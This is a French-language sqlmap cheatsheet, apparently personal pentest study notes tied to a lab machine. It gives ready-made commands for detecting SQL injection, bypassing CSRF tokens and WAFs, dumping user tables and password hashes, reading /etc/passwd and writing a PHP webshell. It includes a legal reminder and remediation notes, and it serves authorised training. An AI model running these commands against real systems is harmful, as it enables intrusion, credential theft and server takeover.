# Cheatsheet — sqlmap

Automatiser la détection et l'exploitation d'**injections SQL**. Le réflexe : capturer la requête vulnérable, laisser sqlmap confirmer l'injection, puis énumérer la base jusqu'au hash/mdp à casser.

**Rappel légal : uniquement sur tes labs et les périmètres autorisés par écrit (art. 323-1 du Code pénal).**

---

## 1. Donner la cible à sqlmap

| Source | Commande |
| --- | --- |
| URL avec paramètre GET | `sqlmap -u "http://cible/p.php?id=1"` |
| Requête capturée (Burp → Save item) | `sqlmap -r req.txt` ← **le plus fiable** (garde cookies, headers, body) |
| POST (données) | `sqlmap -u "http://cible/login" --data "user=a&pass=b"` |
| Cookie authentifié | `--cookie "PHPSESSID=..."` |
| Cibler UN paramètre | `-p email` (sinon sqlmap teste tout) |

> **Toujours privilégier `-r req.txt`** : tu interceptes la requête dans Burp, clic droit → *Copy to file* / *Save item*, et sqlmap rejoue exactement la même (session, CSRF, content-type).

---

## 2. CSRF / token par requête (Laravel, etc.) — piège Usage

Si l'appli exige un jeton anti-CSRF frais à chaque POST (**419 Page Expired** en boucle) :
```bash
sqlmap -r req.txt -p email \
  --csrf-token="_token" \
  --csrf-url="http://cible/forget-password"
```
- `--csrf-token` : nom du champ caché (`_token` pour Laravel).
- `--csrf-url` : page que sqlmap **GET** d'abord pour récupérer un token+cookie neufs avant chaque essai.
> Sans ça, toutes les requêtes sont rejetées → sqlmap ne détecte rien (ce n'est pas que ce n'est pas vulnérable).

---

## 3. Détection

```bash
sqlmap -r req.txt --batch                 # --batch = répond "défaut" à toutes les questions
sqlmap -r req.txt --level 3 --risk 2      # pousser la détection (payloads plus nombreux/risqués)
sqlmap -r req.txt --dbms mysql            # forcer le SGBD si connu (gagne du temps)
```
| Option | Rôle |
| --- | --- |
| `--level 1..5` | nombre de tests (headers, cookies… à partir de 2-3) |
| `--risk 1..3` | payloads plus agressifs (OR, requêtes lourdes) |
| `--batch` | non-interactif |
| `--technique BEUSTQ` | limiter aux techniques voulues (B=bool, T=time, U=union…) |

---

## 4. Énumération (du SGBD au mot de passe)

```bash
sqlmap -r req.txt --batch --dbs                        # lister les bases
sqlmap -r req.txt --batch -D maBase --tables           # tables d'une base
sqlmap -r req.txt --batch -D maBase -T users --columns # colonnes
sqlmap -r req.txt --batch -D maBase -T users -C user,password --dump   # dumper
sqlmap -r req.txt --batch -D maBase -T users --dump    # dumper toute la table
sqlmap -r req.txt --batch --dump-all                   # tout (bruyant)
sqlmap -r req.txt --batch --passwords                  # hashs des comptes SGBD
sqlmap -r req.txt --batch --current-user --current-db --is-dba
```
> On ignore `information_schema` / `performance_schema` / `sys` (bases système). La cible = la base applicative → table des comptes → **hash** → `hashcat -m 3200` (bcrypt) / `-m 0` (md5)…

---

## 5. Types d'injection (ce que sqlmap détecte)

| Code | Type | Idée |
| --- | --- | --- |
| **B** | Boolean-based blind | la page change selon vrai/faux |
| **E** | Error-based | le SGBD renvoie une erreur exploitable |
| **U** | Union-based | on ajoute un `UNION SELECT` pour lire des données |
| **S** | Stacked queries | plusieurs requêtes (`;`) → RCE possible |
| **T** | Time-based blind | `SLEEP()` : le temps de réponse trahit vrai/faux |
| **Q** | Inline queries | sous-requête |

---

## 6. Tuning & contournement WAF

```bash
--threads 5                 # paralléliser (⚠️ inutile avec CSRF par requête)
--delay 1                   # pause entre requêtes (rate-limit)
--random-agent              # User-Agent aléatoire
--proxy http://127.0.0.1:8080   # passer par Burp pour voir ce que sqlmap envoie
--tamper space2comment,between  # contourner un filtre (voir `tamper/`)
--flush-session             # repartir de zéro (oublier la détection stockée)
```

---

## 7. Au-delà du dump (si les droits le permettent)

```bash
sqlmap -r req.txt --batch --sql-shell       # shell SQL interactif
sqlmap -r req.txt --batch --os-shell        # shell OS (si FILE/stacked -> webshell)
sqlmap -r req.txt --batch --file-read /etc/passwd
sqlmap -r req.txt --batch --file-write shell.php --file-dest /var/www/html/shell.php
```
> `--os-shell` tente d'écrire un webshell (droit `FILE` + chemin web accessible requis). À connaître mais souvent plus propre de dumper puis crack.

---

## 8. Recettes prêtes à l'emploi

```bash
# 1) Param GET simple
sqlmap -u "http://cible/item.php?id=1" --batch --dbs

# 2) Login POST
sqlmap -u "http://cible/login" --data "username=a&password=b" -p username --batch

# 3) Page reset Laravel (CSRF) -> dump des admins  [Usage]
sqlmap -r forget.req -p email --batch \
  --csrf-token="_token" --csrf-url="http://cible/forget-password" \
  -D app -T admin_users --dump

# 4) Zone authentifiée
sqlmap -u "http://cible/profile?id=5" --cookie "session=..." -p id --batch --dump
```

---

## 9. À savoir expliquer à l'oral

- **Pourquoi `-r` plutôt que `-u`** : on rejoue la vraie requête (session, CSRF, headers) → beaucoup moins de faux négatifs.
- **blind boolean vs time-based** : l'un lit l'info via le contenu de la page, l'autre via le temps de réponse (`SLEEP`) quand aucune différence visible.
- **Remédiation** : **requêtes préparées / paramétrées** (le correctif n°1), moindre privilège du compte SGBD, pas d'erreurs détaillées renvoyées, WAF en défense en profondeur.
- **Pourquoi ignorer `information_schema`** : ce sont les métadonnées du SGBD, pas les données applicatives.

## Références
- Fiches liées : [burp](burp.md) · [hashcat](hashcat.md) · [gobuster](gobuster.md)
- Machine : [Usage](../machines/Usage.md) (SQLi Laravel + CSRF)
